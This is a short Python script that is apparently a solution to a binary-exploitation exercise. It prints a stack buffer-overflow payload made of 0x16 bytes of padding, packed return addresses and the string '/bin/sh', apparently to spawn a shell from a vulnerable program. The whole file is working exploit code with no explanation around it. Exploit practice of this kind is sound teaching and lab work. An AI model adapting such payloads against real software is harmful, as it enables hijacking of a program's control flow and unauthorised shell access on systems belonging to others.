#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(b'\x41'*0x16)
#sys.stdout.buffer.write(pack('<I', 0x804fc23))
#sys.stdout.buffer.write(pack('<I', 0x0804fc39))
sys.stdout.buffer.write(pack('<I', 0x080488b3))
sys.stdout.buffer.write(pack('<I', 0xfffee194))
sys.stdout.buffer.write(b'/bin/sh')
